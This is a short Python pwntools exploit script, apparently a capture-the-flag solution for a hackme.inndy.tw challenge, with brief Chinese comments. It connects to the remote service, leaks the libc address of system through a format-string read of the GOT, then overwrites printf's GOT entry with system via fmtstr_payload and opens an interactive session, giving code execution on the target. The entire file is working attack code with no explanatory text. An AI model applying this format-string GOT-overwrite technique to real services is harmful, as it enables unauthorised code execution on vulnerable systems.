from pwn import *
import time

context.update(arch="i386", os="linux")

host = "127.0.0.1"
port = 8888
host = "hackme.inndy.tw"
port = 7711
r = remote(host, port)

input("attach in gdb")

system_got = 0x0804a018
printf_got = 0x0804a010

payload = flat([system_got, "%7$s"])

print(payload)
r.sendline(payload)

time.sleep(1)

#print(r.recvline()[4:8])
libc_system = u32(r.recvline()[4:8])
print(libc_system, p32(libc_system))

x_address = printf_got
#要填入的位置
fill_value = libc_system
#要填入的值
N = 7
#&buf = printf第幾個參數的位置

fmt_string = fmtstr_payload(N, {x_address: fill_value}, write_size="byte")

print(fmt_string)

r.sendline(fmt_string);
r.interactive()

